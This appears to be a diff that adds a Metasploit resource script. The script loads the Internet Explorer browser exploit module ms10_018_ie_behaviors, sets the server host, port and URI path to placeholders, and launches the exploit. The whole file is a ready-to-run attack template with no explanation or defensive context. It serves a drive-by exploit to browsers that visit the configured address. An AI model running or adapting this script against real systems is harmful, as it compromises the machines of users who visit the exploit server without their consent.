@@ -1,0 +1,5 @@
+use windows/browser/ms10_018_ie_behaviors
+set SRVHOST <CHANGE_HOST>
+set SRVPORT <CHANGE_PORT>
+set URIPATH <CHANGE_URIPATH>
+exploit
